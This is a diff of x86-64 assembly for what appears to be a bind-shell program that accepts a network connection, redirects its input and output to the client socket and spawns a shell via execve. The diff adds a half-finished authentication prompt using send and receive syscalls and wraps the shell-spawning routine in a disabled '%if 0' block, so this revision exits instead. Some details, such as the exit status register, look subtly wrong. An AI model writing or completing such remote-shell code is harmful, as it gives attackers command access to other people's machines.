@@ -36,8 +36,6 @@ _main:
 	lea rsi, [rbp-16]  	; sockaddr_in struct
 	mov rdx, 16	  	; sockaddr_in size
 	push rdx	  	; create size val ref on stack
-
-%if 0
 	syscall
 	cmp rax, -1
 	jle _exit
@@ -62,9 +60,23 @@ _accept:			; Accept a connection
 	cmp rax, -1
 	jle _exit
 
-; Do auth stuff here
-
 	push rax		; Store client socket id
+
+; auth stuff
+	mov rsi, r15
+	mov rdx, 24
+	call _prompt
+
+	mov rdi, [rbp-40]
+	lea rsi, [rbp-16]
+	mov rdx, 8
+	mov rcx, 0
+	mov r8, 0
+	mov r9, 0
+	mov rax, 45
+	syscall
+
+	jmp _exit
 
 ; Duplicate I/O descriptors 
 	mov r10, rax
@@ -81,9 +93,7 @@ _accept:			; Accept a connection
 	mov rax, r8
 	inc rsi
 	syscall
-
-%endif ; 0
-
+%if 0
 _spawn: ; Spawn shell
 	xor rax, rax
 	push rax
@@ -92,20 +102,27 @@ _spawn: ; Spawn shell
 	shr rbx, 8
 	mov [rbp-16], rbx
 	lea rdi, [rbp-16] 
-	;add rdi, 8
-	;push rdi
-	;sub rdi, 8
 	push rax
 	push rdi
 	mov rsi, rsp
 	add rax, 59
 	syscall
 	nop
-	
+%endif
+
 _exit:
 	mov rax, 0x3c
 	mov rbx, 1
 	syscall	
+
+_prompt:
+	mov rdi, [rbp-40]
+	mov rcx, 0
+	mov r8, 0
+	mov r9, 0
+	mov rax, 44
+	syscall
+	ret
 
 _data:
 	call _main
